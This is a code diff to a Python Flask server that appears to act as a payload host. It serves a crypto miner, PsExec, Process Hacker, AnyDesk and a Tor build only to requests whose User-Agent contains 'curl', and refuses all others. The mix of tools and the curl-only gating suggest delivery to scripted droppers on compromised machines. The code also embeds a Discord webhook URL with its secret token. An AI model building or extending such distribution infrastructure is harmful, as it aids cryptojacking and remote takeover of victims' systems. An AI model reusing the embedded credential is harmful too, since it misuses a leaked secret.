@@ -4,6 +4,11 @@ from flask_httpauth import HTTPBasicAuth
 from werkzeug.security import generate_password_hash, check_password_hash
 app = Flask(__name__)
 
+# OPEN Port 5000 !!!
+
+
+
+
 DiscordURL = 'https://canary.discord.com/api/webhooks/900769374422585404/NBk9F9AN5Kx1ODmX32rvTFRW7PnkY4u8BQ-s7qynJABP6UZ3MlmkTlbMaLWVpjMtIqsV'
 basicAuth = HTTPBasicAuth()
 users = {
@@ -19,7 +24,7 @@ def verify_password(username, password):
     
 @app.route('/api/download/pm.exe')
 def downloadPhoenixMiner():
-    path = "/home/azureuser/ZortosCDN/PsExec.exe"
+    path = "/home/azureuser/ZortosCDN/pm.exe" # Add your own directory
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -28,9 +33,20 @@ def downloadPhoenixMiner():
         print(useragent)
         return 'Access to that resource is forbidden.', 403
 
+@app.route('/api/download/TorBuild.zip')
+def downloadTor():
+    path = "/home/azureuser/ZortosCDN/TorBuild.zip" # Add your own directory
+    useragent = request.headers.get('User-Agent')
+    if 'curl' in useragent:
+        return send_file(path, as_attachment=True)
+    # For windows you need to use drive name [ex: F:/Example.pdf]
+    else:
+        print(useragent)
+        return 'Access to that resource is forbidden.', 403
+    
 @app.route('/api/download/PsExec.exe')
 def downloadpsexec():
-    path = "/home/azureuser/ZortosCDN/PsExec.exe"
+    path = "/home/azureuser/ZortosCDN/PsExec.exe" # Add your own directory
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -43,7 +59,7 @@ def downloadpsexec():
 
 @app.route('/api/download/ph64.exe')
 def downloadProccessHack():
-    path = "/home/azureuser/ZortosCDN/ph64.exe"
+    path = "/home/azureuser/ZortosCDN/ph64.exe" # Add your own directory
     useragent = request.headers.get('User-Agent')
     if 'curl' in useragent:
         return send_file(path, as_attachment=True)
@@ -55,7 +71,7 @@ def downloadProccessHack():
 
 @app.route('/api/download/Anydesk.exe')
 def downloadAnydesk():
-    path = "/home/azureuser/ZortosCDN/Anydesk.exe"
+    path = "/home/azureuser/ZortosCDN/Anydesk.exe" # Add your own directory
     useragent = request.headers.get('User-Agent')
     
     if 'curl' in useragent:
